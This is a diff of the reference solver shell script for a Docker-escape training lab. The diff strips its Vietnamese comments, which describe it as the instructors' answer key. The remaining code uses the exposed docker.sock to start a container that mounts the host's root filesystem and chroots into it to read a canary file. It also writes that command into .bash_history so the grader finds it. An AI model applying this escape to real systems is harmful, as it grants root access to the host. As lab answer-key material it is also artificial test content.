@@ -1,17 +1,4 @@
 #!/bin/bash
-#
-# solver.sh - dso-docker-escape (LOI GIAI MAU, dung de tu test lab - KHONG phat cho
-# sinh vien). Chay TRONG container `app` (vd qua terminal cua lab hoac `docker exec`).
-#
-# Muc dich: tai hien toan bo chuoi Nhiem vu 1 -> 5 bang duong khai thac CHINH
-# (docker.sock, xem BUILD-NOTES.md), tao du cac artifact de goals.config/pregrade.sh
-# cham PASS toan bo (tru escape_via_privileged - vi day la goal tuy chon/lenient da
-# tu dong PASS theo recon_ok).
-#
-# Kiem tra hai chieu theo LAB-BUILD-RULES.md muc 0/7:
-#   - Chay solver.sh nay      -> tat ca goal bat buoc phai PASS.
-#   - KHONG chay gi ca roi cham -> tat ca goal phai FAIL (vi khong co file nao duoc tao).
-#
 set -u
 cd "$HOME" || exit 1
 
@@ -37,7 +24,6 @@ cat "$HOME/recon.txt"
 
 echo
 echo "=== [2/5] escape_via_socket (qua docker.sock) ==="
-# Neu socket unix chua san sang (socat/host-sim con dang khoi dong), du phong qua TCP.
 DHOST="$DOCKER_SOCK"
 if ! docker -H "$DHOST" version >/dev/null 2>&1; then
     echo "[*] $DOCKER_SOCK chua san sang, thu duong du phong TCP $DOCKER_TCP"
@@ -51,8 +37,6 @@ docker -H "$DHOST" ps
 echo "[*] docker -H $DHOST images"
 docker -H "$DHOST" images
 
-# Bang chung "hanh vi" trong bash history de pregrade.sh xac nhan day la lenh that
-# (khong phai echo gia mao gia tri).
 echo "docker -H $DHOST run --rm -v /:/host escimg chroot /host sh -c 'cat /root/.hostmarker'" >> "$HOME/.bash_history"
 
 echo "[*] doc canary /root/.hostmarker cua host-sim qua container moi (escimg)"
